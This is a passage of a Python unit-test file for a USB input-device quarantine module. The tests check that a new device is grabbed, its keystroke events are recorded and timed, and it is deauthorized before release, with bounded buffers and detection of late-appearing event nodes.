        self.read_fd, self.write_fd = os.pipe()
        os.set_blocking(self.read_fd, False)
        self.addCleanup(os.close, self.write_fd)
        self.order = []
        self.udev = mock.Mock()

    def run_observation(self, collect=None, grab=None):
        with mock.patch.object(quarantine, "pyudev", self.udev), \
             mock.patch.object(quarantine, "find_input_nodes", return_value=["/dev/input/event5"]), \
             mock.patch.object(sysfs, "open_input_node", return_value=self.read_fd), \
             mock.patch.object(quarantine, "_grab", side_effect=grab), \
             mock.patch.object(quarantine, "_ungrab", side_effect=lambda _: self.order.append("ungrab")), \
             mock.patch.object(quarantine, "_collect", side_effect=collect):
            return quarantine.quarantine(Path("unused"),
                authorize_fn=lambda: self.order.append("on"),
                deauthorize_fn=lambda: self.order.append("off"), duration=0.01)

    def test_block_happens_before_ungrab(self):
        self.run_observation()
        self.assertEqual(self.order, ["on", "off", "ungrab"])
        with self.assertRaises(OSError):
            os.fstat(self.read_fd)

    def test_exception_still_blocks_before_ungrab(self):
        with self.assertRaises(RuntimeError):
            self.run_observation(collect=RuntimeError("read failed"))
        self.assertEqual(self.order, ["on", "off", "ungrab"])

    def test_failed_grab_stops_and_blocks_immediately(self):
        obs = self.run_observation(grab=OSError("busy"))
        self.assertTrue(obs.grab_failures)
        self.assertEqual(self.order, ["on", "off"])

    def test_event_buffers_are_bounded(self):
        obs = quarantine.Observation(capture=True)
        with mock.patch.object(quarantine, "MAX_EVENTS", 4):
            for _ in range(10):
                quarantine._record_event(quarantine.EV_KEY, 30, 1, obs, time.monotonic())
        self.assertLessEqual(len(obs.raw_events), 4)
        self.assertLessEqual(len(obs.key_presses), 4)
        self.assertTrue(obs.limit_reached)
        os.close(self.read_fd)

    def test_queued_event_timing_uses_kernel_timestamps(self):
        events = b"".join(struct.pack(quarantine.INPUT_EVENT_FORMAT, 1000, us,
                                     quarantine.EV_KEY, 30, 1) for us in (100000, 900000))
        os.write(self.write_fd, events)
        obs = quarantine.Observation()
        quarantine._collect([self.read_fd], obs, 0.01, wall_start=1000)
        self.assertAlmostEqual(obs.intervals()[0], 0.8)
        os.close(self.read_fd)

    def test_collection_checks_for_late_nodes(self):
        second_read, second_write = os.pipe()
        self.addCleanup(os.close, second_write)
        os.set_blocking(second_read, False)
        with mock.patch.object(quarantine, "pyudev", self.udev), \
             mock.patch.object(quarantine, "find_input_nodes", side_effect=[
                 ["/dev/input/event5"], ["/dev/input/event5", "/dev/input/event6"]
             ]) as discover, \
             mock.patch.object(sysfs, "open_input_node", side_effect=[self.read_fd, second_read]), \
             mock.patch.object(quarantine, "_grab"), \
             mock.patch.object(quarantine, "_ungrab"):
            obs = quarantine.quarantine(Path("unused"), lambda: None,
                                        deauthorize_fn=lambda: None, duration=0.001)
        self.assertEqual(obs.grabbed, ["/dev/input/event5", "/dev/input/event6"])
        # The late node was found by asking again, not by the first scan.
        self.assertGreaterEqual(discover.call_count, 2)
        for fd in (self.read_fd, second_read):
            with self.assertRaises(OSError):
                os.fstat(fd)


if __name__ == "__main__":
    unittest.main()
